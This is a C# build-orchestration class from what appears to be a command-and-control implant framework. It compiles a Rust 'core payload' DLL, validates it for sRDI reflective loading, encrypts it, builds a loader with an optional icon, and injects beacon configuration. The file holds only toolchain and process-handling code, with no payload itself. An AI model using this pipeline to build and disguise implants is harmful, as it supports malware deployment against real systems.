using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Models;

namespace LibraNextgen.Service.Services;

/// <summary>
/// Orchestrates asynchronous Rust builds (core DLL → encrypt → loader → config injection).
/// Stage implementations live in <see cref="BuilderBuildService"/> (partial class, BuilderBuildStages.cs).
/// </summary>
public partial class BuilderBuildService
{
    public static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    public static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");
    public static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
    public static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");

    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
    private static readonly string ModulesDir = Path.Combine(OutputBase, "modules");

    public static readonly Dictionary<string, string> PlatformOs = new()
    {
        ["x64"] = "windows",
        ["x86"] = "windows",
        ["linux-x64"] = "linux",
    };

    /// <summary>
    /// Resolve the actual Rust target triple for a requested platform based on
    /// the operating system the server itself is running on:
    ///   Windows host → native MSVC for Win targets.
    ///   Linux host   → native GNU for Linux targets.
    /// All cross-combinations use the gnu ABI and the zig toolchain (cargo
    /// zigbuild drives zig as CC/linker, which bundles glibc/msvc support).
    /// Note: musl cannot be used here because the core payload is a cdylib.
    /// </summary>
    public static string ResolveTriple(string platform, bool hostWindows)
    {
        return PlatformOs[platform] switch
        {
            "windows" when hostWindows => platform == "x86" ? "i686-pc-windows-msvc" : "x86_64-pc-windows-msvc",
            "windows" => platform == "x86" ? "i686-pc-windows-gnu" : "x86_64-pc-windows-gnu",
            "linux" => "x86_64-unknown-linux-gnu",
            _ => throw new InvalidOperationException($"no triple for platform '{platform}'"),
        };
    }

    public static readonly ConcurrentDictionary<string, BuildJob> ActiveJobs = new();
    public static readonly object BuildLock = new();

    private readonly BeaconSettings _beaconSettings;

    public BuilderBuildService(IOptions<BeaconSettings> beaconSettings)
    {
        _beaconSettings = beaconSettings.Value;
    }

    // ── Build (async) ──────────────────────────────────────────────────

    public async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
    {
        var ctx = new BuildContext
        {
            BuildId = buildId,
            Req = req,
            TempDir = Path.Combine(OutputBase, buildId),
        };
        ctx.TargetDir = Path.Combine(ctx.TempDir, "target");
        ctx.FinalDir = ctx.TempDir;

        try
        {
            lock (BuildLock)
            {
                if (Directory.Exists(ctx.TempDir)) Directory.Delete(ctx.TempDir, true);
                Directory.CreateDirectory(ctx.TempDir);
            }

            // Check cargo availability
            job.Log("Checking Rust toolchain...");
            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
            if (cargoCheck.ExitCode != 0)
            {
                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
                UpdateHistory(job);
                return;
            }
            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");

            // Determine target triple + OS (host-aware)
            var os = PlatformOs[req.Platform]; // Build() already validated the key
            var hostWindows = OperatingSystem.IsWindows();
            ctx.TargetTriple = ResolveTriple(req.Platform, hostWindows);
            ctx.TargetOs = os;
            ctx.IsCross = !(os == "windows" && hostWindows) && !(os == "linux" && !hostWindows);
            var targetArg = $"--target {ctx.TargetTriple}";

            // Desktop mode: add --features desktop
            var featuresArg = req.ApplicationType == "Desktop" ? "--features desktop" : "";

            // Set RUSTFLAGS for strip if requested
            if (req.StripSymbols)
            {
                ctx.EnvVars["RUSTFLAGS"] = "-C strip=symbols";
                job.Log("Strip symbols enabled (RUSTFLAGS=-C strip=symbols)");
            }

            ctx.IsWindows = os == "windows";
            ctx.IsMacos = os == "macos";
            ctx.ReleaseDir = Path.Combine(ctx.TargetDir, ctx.TargetTriple, "release");
            ctx.ModuleExt = ctx.IsWindows ? "dll" : ctx.IsMacos ? "dylib" : "so";

            // ── Cross-compilation toolchain ──
            // Native builds need nothing extra. Cross builds require the zig
            // toolchain (cargo-zigbuild + zig on PATH); rustup must know the
            // target's std (added below, best-effort).
            if (ctx.IsCross)
            {
                job.Log($"Cross-compiling {req.Platform} ({ctx.TargetTriple}) from {(hostWindows ? "Windows" : "Linux")} host");

                var zigbuild = await RunProcessAsync("cargo", "zigbuild --help", job);
                var zig = await RunProcessAsync("zig", "version", job);
                if (zigbuild.ExitCode != 0 || zig.ExitCode != 0)
                {
                    job.Fail(
                        "Cross-compilation requires the zig toolchain.\n" +
                        "Install zig (https://ziglang.org/download) and cargo-zigbuild:\n" +
                        "  cargo install cargo-zigbuild\n" +
                        "and ensure both are on PATH.");
                    UpdateHistory(job);
                    return;
                }
                job.Log($"zig {zig.Stdout.Trim()} | cargo-zigbuild ready");
            }
            else
            {
                job.Log($"Native build for {req.Platform} ({ctx.TargetTriple})");
            }

            // Best-effort: make sure the rust target std is installed.
            var targetAdd = await RunProcessAsync("rustup", $"target add {ctx.TargetTriple}", job);
            if (targetAdd.ExitCode != 0)
                job.Log("[WARN] rustup target add failed — build may fail if the target is missing");

            var buildSteps = new Func<Task>[]
            {
                () => Stage1_BuildCoreAsync(ctx, targetArg, job),
                () => Stage1_5_ValidateSrdiAsync(ctx, job),
                () => Stage1_6_BuildModuleAsync(ctx, targetArg, job),
                () => Stage2_EncryptCoreAsync(ctx, job),
                () => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job),
                () => Stage4_InjectConfigAsync(ctx, job),
            };

            foreach (var step in buildSteps)
            {
                await step();
                if (job.IsCompleted) break; // success or failure — finalize history below
            }

            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail($"Build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                ActiveJobs.TryRemove(buildId, out _);
            });
        }
    }

    /// <summary>
    /// Build the cargo invocation for a build step. Cross-compilations go
    /// through `cargo zigbuild` which drives the zig toolchain as a universal
    /// cross linker/cc; native builds use plain `cargo build`.
    /// </summary>
    internal static string CargoBuildCommand(BuildContext ctx, string targetArg, string extraArgs)
    {
        // cargo-zigbuild 0.23 uses `cargo zigbuild --release ...` (no "build"
        // subcommand); native builds use `cargo build --release ...`.
        var verb = ctx.IsCross ? "zigbuild" : "build";
        return $" {verb} --release {targetArg} {extraArgs} --target-dir \"{ctx.TargetDir}\"";
    }

    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null, Dictionary<string, string>? envVars = null)
    {
        var psi = new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (workingDir != null) psi.WorkingDirectory = workingDir;
        if (envVars != null)
        {
            foreach (var (key, value) in envVars)
                psi.Environment[key] = value;
        }

        using var proc = new Process { StartInfo = psi };
        var stdoutTcs = new TaskCompletionSource<string>();
        var stderrTcs = new TaskCompletionSource<string>();
        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        proc.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
            else stdoutTcs.TrySetResult(stdout.ToString());
        };
        proc.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
            else stderrTcs.TrySetResult(stderr.ToString());
        };

        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        await proc.WaitForExitAsync();
        var stdoutStr = await stdoutTcs.Task;
        var stderrStr = await stderrTcs.Task;

        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
    }

    public static void UpdateHistory(BuildJob job)
    {
        var history = LoadHistory();
        var idx = history.FindIndex(r => r.Id == job.Record.Id);
        if (idx >= 0)
            history[idx] = job.Record;
        else
            history.Insert(0, job.Record);
        SaveHistory(history);
    }

    public static List<BuildRecord> LoadHistory()
    {
        try
        {
            if (System.IO.File.Exists(HistoryFile))
            {
                var json = System.IO.File.ReadAllText(HistoryFile);
                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
            }
        }
        catch { }
        return new List<BuildRecord>();
    }

    public static void SaveHistory(List<BuildRecord> records)
    {
        try
        {
            Directory.CreateDirectory(OutputBase);
            var json = JsonSerializer.Serialize(records);
            System.IO.File.WriteAllText(HistoryFile, json);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[WARN] Failed to save build history: {ex.Message}");
        }
    }
}
